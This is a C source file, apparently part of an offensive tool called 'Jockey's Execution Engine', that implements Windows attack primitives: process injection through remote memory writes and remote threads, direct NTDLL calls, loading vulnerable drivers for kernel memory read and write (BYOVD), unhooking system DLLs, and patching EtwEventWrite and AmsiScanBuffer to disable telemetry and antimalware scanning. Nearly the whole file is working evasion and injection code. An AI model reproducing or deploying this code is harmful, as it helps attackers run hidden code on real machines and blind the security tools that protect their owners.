/* ============================================================================
 * Jockey's Execution Engine -- pal_win.c
 * Windows Platform Abstraction Layer.
 * Real implementations: process ops, memory ops, thread ops, syscalls,
 * driver loading, API unhooking, telemetry bypass.
 * ============================================================================ */

#ifdef _WIN32

#include "pal.h"
#include "byovd.h"
#include <windows.h>
#include <winternl.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ------------------------------------------------------------------
 * PalProcess structure
 * ------------------------------------------------------------------ */
struct PalProcess {
    HANDLE process;
    HANDLE thread;
    DWORD pid;
};

/* ------------------------------------------------------------------
 * Global flag for direct syscalls
 * ------------------------------------------------------------------ */
static int g_useDirectSyscalls = 0;

void pal_set_use_direct_syscalls(int flag) {
    g_useDirectSyscalls = flag;
}

/* ------------------------------------------------------------------
 * NTDLL function pointers (lazy init)
 * ------------------------------------------------------------------ */
static HMODULE hNtdll = NULL;
static NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG) = NULL;
static NTSTATUS (NTAPI *pNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T) = NULL;
static NTSTATUS (NTAPI *pNtCreateThreadEx)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID) = NULL;
static NTSTATUS (NTAPI *pNtOpenProcess)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PVOID) = NULL;

static int init_ntdll_functions(void) {
    if (hNtdll) return 0;
    hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return -1;

    union {
        FARPROC proc;
        NTSTATUS (NTAPI *fn)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    } allocate = { .proc = GetProcAddress(hNtdll, "NtAllocateVirtualMemory") };
    union {
        FARPROC proc;
        NTSTATUS (NTAPI *fn)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
    } write = { .proc = GetProcAddress(hNtdll, "NtWriteVirtualMemory") };
    union {
        FARPROC proc;
        NTSTATUS (NTAPI *fn)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
    } createThread = { .proc = GetProcAddress(hNtdll, "NtCreateThreadEx") };
    union {
        FARPROC proc;
        NTSTATUS (NTAPI *fn)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PVOID);
    } openProcess = { .proc = GetProcAddress(hNtdll, "NtOpenProcess") };

    pNtAllocateVirtualMemory = allocate.fn;
    pNtWriteVirtualMemory = write.fn;
    pNtCreateThreadEx = createThread.fn;
    pNtOpenProcess = openProcess.fn;

    if (!pNtAllocateVirtualMemory || !pNtWriteVirtualMemory || !pNtCreateThreadEx || !pNtOpenProcess)
        return -1;
    return 0;
}

/* ------------------------------------------------------------------
 * Process Management
 * ------------------------------------------------------------------ */
int pal_create_process_suspended(const char* image_path, PalProcess** out) {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    if (!CreateProcessA(NULL, (LPSTR)image_path, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi))
        return -1;
    PalProcess* p = (PalProcess*)malloc(sizeof(PalProcess));
    if (!p) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return -1; }
    p->process = pi.hProcess;
    p->thread  = pi.hThread;
    p->pid     = pi.dwProcessId;
    *out = p;
    return 0;
}

int pal_resume_process(PalProcess* proc) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll) {
        typedef NTSTATUS (NTAPI *NtResumeProcess_t)(HANDLE);
        union {
            FARPROC proc;
            NtResumeProcess_t fn;
        } ntResumeProcess = { .proc = GetProcAddress(ntdll, "NtResumeProcess") };
        if (ntResumeProcess.proc) {
            NTSTATUS status = ntResumeProcess.fn(proc->process);
            if (status == 0) return 0;
        }
    }
    DWORD count = ResumeThread(proc->thread);
    if (count == (DWORD)-1) return -1;
    while (count > 1) {
        count = ResumeThread(proc->thread);
        if (count == (DWORD)-1) return -1;
    }
    return 0;
}

int pal_terminate_process(PalProcess* proc) {
    return TerminateProcess(proc->process, 0) ? 0 : -1;
}

int pal_wait_for_process(PalProcess* proc) {
    return WaitForSingleObject(proc->process, INFINITE) == WAIT_OBJECT_0 ? 0 : -1;
}

void pal_close_process(PalProcess* proc) {
    if (proc) {
        CloseHandle(proc->process);
        CloseHandle(proc->thread);
        free(proc);
    }
}

uint32_t pal_get_pid(PalProcess* proc) {
    return proc ? proc->pid : 0;
}

/* ------------------------------------------------------------------
 * Remote Memory Operations
 * ------------------------------------------------------------------ */
static DWORD ProtectionToWin32(int protection) {
    switch (protection) {
        case PAL_PROT_EXECUTE:       return PAGE_EXECUTE;
        case PAL_PROT_READ:          return PAGE_READONLY;
        case PAL_PROT_WRITE:         return PAGE_READWRITE;
        case PAL_PROT_READWRITE:     return PAGE_READWRITE;
        case PAL_PROT_EXECUTE_READ:  return PAGE_EXECUTE_READ;
        case PAL_PROT_RWX:           return PAGE_EXECUTE_READWRITE;
        default:                     return PAGE_READWRITE;
    }
}

void* pal_allocate_memory_remote(PalProcess* proc, size_t size, int protection) {
    DWORD flProtect = ProtectionToWin32(protection);
    if (g_useDirectSyscalls) {
        if (init_ntdll_functions() != 0) return NULL;
        void* addr = NULL;
        SIZE_T sz = size;
        NTSTATUS status = pNtAllocateVirtualMemory(proc->process, &addr, 0, &sz,
                                                   MEM_COMMIT | MEM_RESERVE, flProtect);
        return (status == 0) ? addr : NULL;
    }
    return VirtualAllocEx(proc->process, NULL, size, MEM_COMMIT | MEM_RESERVE, flProtect);
}

int pal_write_memory_remote(PalProcess* proc, void* dest, const void* src, size_t size) {
    if (g_useDirectSyscalls) {
        if (init_ntdll_functions() != 0) return -1;
        SIZE_T written;
        NTSTATUS status = pNtWriteVirtualMemory(proc->process, dest, (PVOID)src, size, &written);
        return (status == 0 && written == size) ? 0 : -1;
    }
    SIZE_T written;
    return (WriteProcessMemory(proc->process, dest, src, size, &written) && written == size) ? 0 : -1;
}

int pal_read_memory_remote(PalProcess* proc, const void* src, void* dest, size_t size) {
    SIZE_T read;
    return (ReadProcessMemory(proc->process, src, dest, size, &read) && read == size) ? 0 : -1;
}

int pal_protect_memory_remote(PalProcess* proc, void* addr, size_t size, int protection) {
    DWORD old;
    DWORD flProtect = ProtectionToWin32(protection);
    return VirtualProtectEx(proc->process, addr, size, flProtect, &old) ? 0 : -1;
}

int pal_free_memory_remote(PalProcess* proc, void* addr) {
    return VirtualFreeEx(proc->process, addr, 0, MEM_RELEASE) ? 0 : -1;
}

/* ------------------------------------------------------------------
 * Remote Thread Operations
 * ------------------------------------------------------------------ */
int pal_create_remote_thread(PalProcess* proc, void* start_routine, void* arg) {
    if (g_useDirectSyscalls) {
        if (init_ntdll_functions() != 0) return -1;
        HANDLE hThread;
        NTSTATUS status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, proc->process,
                                            start_routine, arg, 0, 0, 0, 0, NULL);
        if (status != 0) return -1;
        CloseHandle(hThread);
        return 0;
    }
    HANDLE h = CreateRemoteThread(proc->process, NULL, 0,
                                  (LPTHREAD_START_ROUTINE)(uintptr_t)start_routine, arg, 0, NULL);
    if (!h) return -1;
    CloseHandle(h);
    return 0;
}

int pal_get_thread_context(PalProcess* proc, void* context) {
    CONTEXT* ctx = (CONTEXT*)context;
    ctx->ContextFlags = CONTEXT_FULL;
    return GetThreadContext(proc->thread, ctx) ? 0 : -1;
}

int pal_set_thread_context(PalProcess* proc, const void* context) {
    return SetThreadContext(proc->thread, (CONTEXT*)context) ? 0 : -1;
}

/* ------------------------------------------------------------------
 * Kernel / Driver Operations (BYOVD)
 * ------------------------------------------------------------------ */
int pal_load_driver(const char* driver_path) {
    return load_byovd(driver_path);
}
int pal_unload_driver(const char* driver_name) {
    return unload_byovd(driver_name);
}
int pal_read_kernel_memory(uintptr_t address, void* buffer, size_t size) {
    return read_kernel_memory(address, buffer, size);
}
int pal_write_kernel_memory(uintptr_t address, const void* buffer, size_t size) {
    return write_kernel_memory(address, buffer, size);
}

/* ------------------------------------------------------------------
 * API Unhooking -- restore .text from clean disk mapping
 * ------------------------------------------------------------------ */
int pal_unhook_module(const char* module_name) {
    HMODULE hMod = GetModuleHandleA(module_name);
    if (!hMod) return -1;

    char path[MAX_PATH];
    if (!GetModuleFileNameA(hMod, path, sizeof(path))) return -1;

    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return -1;

    HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMap) { CloseHandle(hFile); return -1; }

    LPVOID pClean = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    if (!pClean) { CloseHandle(hMap); CloseHandle(hFile); return -1; }

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    int patched = 0;

    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (pSec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            LPVOID target = (BYTE*)hMod + pSec[i].VirtualAddress;
            LPVOID source = (BYTE*)pClean + pSec[i].VirtualAddress;
            DWORD size = pSec[i].Misc.VirtualSize ? pSec[i].Misc.VirtualSize : pSec[i].SizeOfRawData;
            if (size == 0) continue;
            DWORD oldProtect;
            if (VirtualProtect(target, size, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                memcpy(target, source, size);
                VirtualProtect(target, size, oldProtect, &oldProtect);
                patched++;
            }
        }
    }

    UnmapViewOfFile(pClean);
    CloseHandle(hMap);
    CloseHandle(hFile);
    return patched > 0 ? 0 : -1;
}

/* ------------------------------------------------------------------
 * Telemetry Bypass -- ETW + AMSI
 * ------------------------------------------------------------------ */
int pal_bypass_telemetry(void) {
    int ret = 0;

    /* Disable ETW */
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll) {
        FARPROC pEtwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");
        if (pEtwEventWrite) {
            BYTE patch[] = { 0x33, 0xC0, 0xC3 }; /* xor eax,eax; ret */
            DWORD oldProtect;
            uintptr_t etwAddress = (uintptr_t)(void (*)(void))pEtwEventWrite;
            if (VirtualProtect((LPVOID)etwAddress, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
                memcpy((void*)etwAddress, patch, sizeof(patch));
                VirtualProtect((LPVOID)etwAddress, sizeof(patch), oldProtect, &oldProtect);
            } else {
                ret = -1;
            }
        }
    }

    /* Disable AMSI */
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (hAmsi) {
        FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
        if (pAmsiScanBuffer) {
            DWORD oldProtect;
#ifdef _WIN64
            BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
#else
            BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
#endif
            uintptr_t amsiAddress = (uintptr_t)(void (*)(void))pAmsiScanBuffer;
            if (VirtualProtect((LPVOID)amsiAddress, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
                memcpy((void*)amsiAddress, patch, sizeof(patch));
                VirtualProtect((LPVOID)amsiAddress, sizeof(patch), oldProtect, &oldProtect);
            } else {
                ret = -1;
            }
        }
    }

    /* Unhook common targets */
    pal_unhook_module("ntdll.dll");
    pal_unhook_module("kernel32.dll");
    pal_unhook_module("kernelbase.dll");

    return ret;
}

/* ------------------------------------------------------------------
 * Direct Syscall Wrappers
 * ------------------------------------------------------------------ */

int pal_syscall_open_process(uint32_t pid, int access, PalProcess** out) {
    if (init_ntdll_functions() != 0) return -1;
    HANDLE hProcess;
    CLIENT_ID cid = { (HANDLE)(uintptr_t)pid, NULL };
    OBJECT_ATTRIBUTES oa = {0};
    oa.Length = sizeof(oa);
    NTSTATUS status = pNtOpenProcess(&hProcess, access, &oa, &cid);
    if (status != 0) return -1;
    PalProcess* p = (PalProcess*)malloc(sizeof(PalProcess));
    if (!p) { CloseHandle(hProcess); return -1; }
    p->process = hProcess;
    p->thread = NULL;
    p->pid = pid;
    *out = p;
    return 0;
}

int pal_syscall_allocate_memory(PalProcess* proc, void** addr, size_t size, int protection) {
    if (init_ntdll_functions() != 0) return -1;
    SIZE_T sz = size;
    ULONG flProtect = ProtectionToWin32(protection);
    NTSTATUS status = pNtAllocateVirtualMemory(proc->process, addr, 0, &sz,
                                               MEM_COMMIT | MEM_RESERVE, flProtect);
    return (status == 0) ? 0 : -1;
}

int pal_syscall_write_memory(PalProcess* proc, void* dest, const void* src, size_t size) {
    if (init_ntdll_functions() != 0) return -1;
    SIZE_T written;
    NTSTATUS status = pNtWriteVirtualMemory(proc->process, dest, (PVOID)src, size, &written);
    return (status == 0 && written == size) ? 0 : -1;
}

#endif /* _WIN32 */
